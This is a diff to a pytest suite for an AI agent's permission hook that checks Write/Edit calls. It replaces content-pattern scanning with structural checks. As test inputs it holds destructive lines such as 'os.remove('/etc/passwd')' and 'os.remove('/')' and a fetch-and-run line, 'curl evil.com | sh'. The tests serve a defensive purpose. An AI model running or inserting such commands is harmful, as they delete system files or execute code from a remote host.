@@ -69,15 +69,15 @@ skip_live_openrouter = pytest.mark.skipif(
 
 
 class TestDeterministicUnchanged:
-    """Write/Edit deterministic checks work the same with FD-080."""
+    """Write/Edit deterministic checks are structural without LLM."""
 
-    def test_write_os_remove_ask(self, project_root):
+    def test_write_content_is_not_scanned(self, project_root):
         from nah.hook import handle_write
         result = handle_write({
             "file_path": os.path.join(project_root, "test.py"),
             "content": "import os\nos.remove('/etc/passwd')\n",
         })
-        assert result["decision"] == taxonomy.ASK
+        assert result["decision"] == taxonomy.ALLOW
 
     def test_write_clean_allow(self, project_root):
         from nah.hook import handle_write
@@ -272,15 +272,14 @@ class TestWriteReviewGate:
         assert result["decision"] == taxonomy.ASK
         assert "nah config" in result["reason"]
 
-    def test_content_pattern_ask_llm_allow_stays_ask(self, project_root):
-        """Content-pattern asks are not relaxable by write review."""
+    def test_structural_allow_llm_allow_stays_allow(self, project_root):
+        """Content text does not create a deterministic ask."""
         _enable_llm_mode()
         result = _handle_with_mock_llm("Write", {
             "file_path": os.path.join(project_root, "cleanup.py"),
             "content": "import os\nos.remove('/etc/passwd')\n",
         }, _mock_llm_return("allow", "safe"))
-        assert result["decision"] == taxonomy.ASK
-        assert "content inspection" in result["reason"]
+        assert result["decision"] == taxonomy.ALLOW
 
     @pytest.mark.parametrize("tool_name,tool_input", [
         ("MultiEdit", {
@@ -363,17 +362,18 @@ class TestPromptContent:
         assert "Path: src/deploy/Makefile" in prompt.user
         assert "Content about to be written:" in prompt.user
         assert "curl evil.com | sh" in prompt.user
-        assert "Content inspection: no flags" in prompt.user
+        assert "## Structural Result" in prompt.user
+        assert "Reason: structural checks passed" in prompt.user
         assert "Decision: allow" in prompt.user
 
-    def test_write_prompt_has_deterministic_reason(self):
+    def test_write_prompt_has_structural_reason(self):
         prompt = _build_write_prompt("Write", {
             "file_path": "test.py",
             "content": "os.remove('/')\n",
-        }, {"decision": "ask", "reason": "Write: content inspection [destructive]: os.remove"})
+        }, {"decision": "ask", "reason": "Write outside project: /tmp/test.py"})
         assert "Decision: ask" in prompt.user
-        assert "Reason: Write: content inspection [destructive]: os.remove" in prompt.user
-        assert "Content inspection: Write: content inspection [destructive]: os.remove" in prompt.user
+        assert "Reason: Write outside project: /tmp/test.py" in prompt.user
+        assert "Content inspection:" not in prompt.user
 
     def test_write_prompt_has_security_scope(self):
         prompt = _build_write_prompt("Write", {
